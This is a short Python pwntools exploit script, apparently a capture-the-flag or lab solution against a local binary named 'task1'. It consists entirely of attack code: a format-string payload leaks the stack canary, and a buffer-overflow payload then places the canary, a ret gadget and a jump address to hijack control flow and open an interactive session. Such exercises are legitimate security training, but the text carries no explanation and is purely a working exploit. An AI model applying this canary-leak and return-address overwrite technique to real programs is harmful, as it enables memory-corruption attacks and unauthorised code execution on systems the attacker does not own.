from pwn import *
from pwn import p64

context.log_level = "error"
io = process("./task1")

io.recvline()

payload = b"%31$p"
io.sendline(payload)
canary = int(io.recvline().strip(),16)

payload = b"A" * 40
payload += p64(canary)
payload += b"A" * 8
payload += p64(0x000000000040101a)
payload += p64(0x401196)

io.sendline(payload)
io.interactive()